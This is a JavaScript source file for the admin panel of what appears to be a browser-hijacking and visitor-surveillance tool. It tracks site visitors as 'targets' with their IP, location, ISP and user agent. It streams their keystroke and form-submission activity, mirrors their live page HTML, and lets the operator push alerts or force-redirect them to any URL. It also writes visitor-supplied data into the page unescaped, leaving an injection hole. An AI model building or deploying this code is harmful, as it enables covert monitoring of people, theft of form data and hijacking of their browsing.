document.addEventListener('DOMContentLoaded', () => {
    // Connect to the socket server
    const socket = io();
    const tableBody = document.getElementById('visitors-body');
    let currentTargetIp = null;

    // Parse URL for specific IP filtering (e.g. /chulda?ip=1.2.3.4)
    const urlParams = new URLSearchParams(window.location.search);
    const filterIp = urlParams.get('ip');

    // Notify server we are an admin
    socket.emit('admin_join');

    // Update Top Stats
    function updateStats() {
        const activeCount = document.querySelectorAll('#visitors-body tr:not(.empty-row)').length;
        document.getElementById('stat-active-count').textContent = activeCount;
    }

    // Display initial empty state if no socket events have fired yet
    function checkEmptyState() {
        if (tableBody.children.length === 0) {
            tableBody.innerHTML = `
                <tr class="empty-row" id="empty-placeholder">
                    <td colspan="8">Awaiting target telemetry...</td>
                </tr>
            `;
        }
        updateStats();
    }

    checkEmptyState();

    // Setup Smart Search / Filter
    const searchInput = document.getElementById('target-search');
    if (searchInput) {
        searchInput.addEventListener('input', (e) => {
            const term = e.target.value.toLowerCase();
            const rows = document.querySelectorAll('#visitors-body tr:not(.empty-row)');

            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                if (text.includes(term)) {
                    row.style.display = '';
                } else {
                    row.style.display = 'none';
                }
            });
        });
    }

    // Listen for new visitor data broadcasted from the server
    socket.on('new_visitor', (data) => {
        addVisitorRow(data);
    });

    // Listen for initial visitors payload
    socket.on('initial_visitors', (visitors) => {
        visitors.forEach(visitor => addVisitorRow(visitor));
    });

    function addVisitorRow(data) {
        // Enforce IP filtering if active
        if (filterIp && data.ip && data.ip !== filterIp) {
            return;
        }

        // Remove the empty placeholder if it exists
        const placeholder = document.getElementById('empty-placeholder');
        if (placeholder) {
            placeholder.remove();
        }

        // Check if row already exists
        if (document.getElementById(`visitor-${data.socketId}`)) {
            return;
        }

        const newRow = document.createElement('tr');
        // Add animation class
        newRow.style.animation = 'slideIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards';
        // Use the socket ID as the row ID to easily remove it later if they disconnect
        newRow.id = `visitor-${data.socketId}`;

        // Create table cells
        const timeCell = document.createElement('td');
        const dateObj = new Date(data.timestamp || Date.now());
        timeCell.textContent = dateObj.toLocaleTimeString();

        const idCell = document.createElement('td');
        idCell.textContent = data.socketId;
        idCell.style.color = '#38bdf8'; // Highlight ID color
        idCell.style.fontWeight = '500';

        const ipCell = document.createElement('td');
        if (data.ip) {
            ipCell.innerHTML = `<span style="color: var(--accent); font-weight: 500;">${data.ip}</span>`;
            newRow.style.cursor = 'pointer';
            newRow.addEventListener('click', () => {
                window.location.href = `/dash?ip=${data.ip}`;
            });
            newRow.title = "Open Tools Dashboard";
        } else {
            ipCell.textContent = 'Unknown';
        }

        const locationCell = document.createElement('td');
        if (data.countryCode) {
            locationCell.innerHTML = `<img src="https://flagcdn.com/20x15/${data.countryCode}.png" alt="${data.countryCode}" style="vertical-align: middle; margin-right: 5px; border-radius: 2px;"> ${data.location}`;
        } else {
            locationCell.textContent = data.location || 'Unknown';
        }
        if (data.isp) locationCell.title = `ISP: ${data.isp}`;

        const urlCell = document.createElement('td');
        urlCell.textContent = data.url;

        const uaCell = document.createElement('td');
        // Truncate long user agents for cleaner display
        uaCell.textContent = data.userAgent.length > 50
            ? data.userAgent.substring(0, 50) + '...'
            : data.userAgent;
        uaCell.title = data.userAgent; // Full string on hover

        const activityCell = document.createElement('td');
        activityCell.id = `activity-${data.socketId}`;
        activityCell.innerHTML = `<span style="color: #64748b; font-style: italic;">No activity yet.</span>`;

        // Append cells to row
        newRow.appendChild(timeCell);
        newRow.appendChild(idCell);
        newRow.appendChild(ipCell);
        newRow.appendChild(locationCell);
        newRow.appendChild(urlCell);
        newRow.appendChild(uaCell);
        newRow.appendChild(activityCell);

        // Insert new row at the top of the table
        tableBody.insertBefore(newRow, tableBody.firstChild);

        // Update stats
        updateStats();
    }

    // Live View Modal close logic
    document.getElementById('close-live-view').onclick = () => {
        document.getElementById('live-view-modal').style.display = 'none';
        socket.emit('stop_live_view'); // Optional: tell server/client to stop emitting
    };

    // Custom Modal Submit Handlers
    document.getElementById('send-alert-btn').onclick = () => {
        const msg = document.getElementById('alert-message-input').value.trim();
        if (msg && currentTargetIp) {
            socket.emit('admin_command', {
                targetIp: currentTargetIp,
                command: 'alert',
                payload: msg
            });
            document.getElementById('alert-modal').style.display = 'none';
        }
    };

    document.getElementById('send-redirect-btn').onclick = () => {
        const selectUrl = document.getElementById('redirect-select').value;
        const customUrl = document.getElementById('redirect-custom-input').value.trim();
        const finalUrl = customUrl || selectUrl;

        if (finalUrl && currentTargetIp) {
            socket.emit('force_redirect', {
                targetIp: currentTargetIp,
                url: finalUrl
            });
            document.getElementById('redirect-modal').style.display = 'none';
        }
    };

    // Listen for live HTML updates from visitors
    socket.on('live_view_html', (data) => {
        const rawTargetText = document.getElementById('live-view-target').textContent;
        const currentTargetIp = rawTargetText.replace('IP: ', '');

        // Only update if we are still viewing this user's IP
        if (currentTargetIp === data.ip) {
            const iframe = document.getElementById('live-view-frame');
            iframe.srcdoc = data.html;
        }
    });

    // Optional: Handle visitor disconnection to remove them from the table
    socket.on('visitor_disconnected', (data) => {
        const socketId = typeof data === 'string' ? data : data.socketId;
        const row = document.getElementById(`visitor-${socketId}`);
        if (row) {
            row.remove();
            checkEmptyState();
        }
    });

    // Listen for live activity events from visitors
    socket.on('visitor_activity', (data) => {
        const cell = document.getElementById(`activity-${data.socketId}`);
        if (cell) {
            const typeColor = data.type === 'form_submit' ? '#10b981' : (data.type === 'input_change' ? '#f59e0b' : '#3b82f6');
            cell.innerHTML = `
                <strong style="color: ${typeColor};">${data.type.toUpperCase()}:</strong><br>
                <small style="color: #cbd5e1;">${data.details}</small>
            `;

            // Highlight the cell briefly to draw attention
            cell.style.backgroundColor = 'rgba(56, 189, 248, 0.2)';
            setTimeout(() => { cell.style.backgroundColor = 'transparent'; }, 500);
        }
    });
});
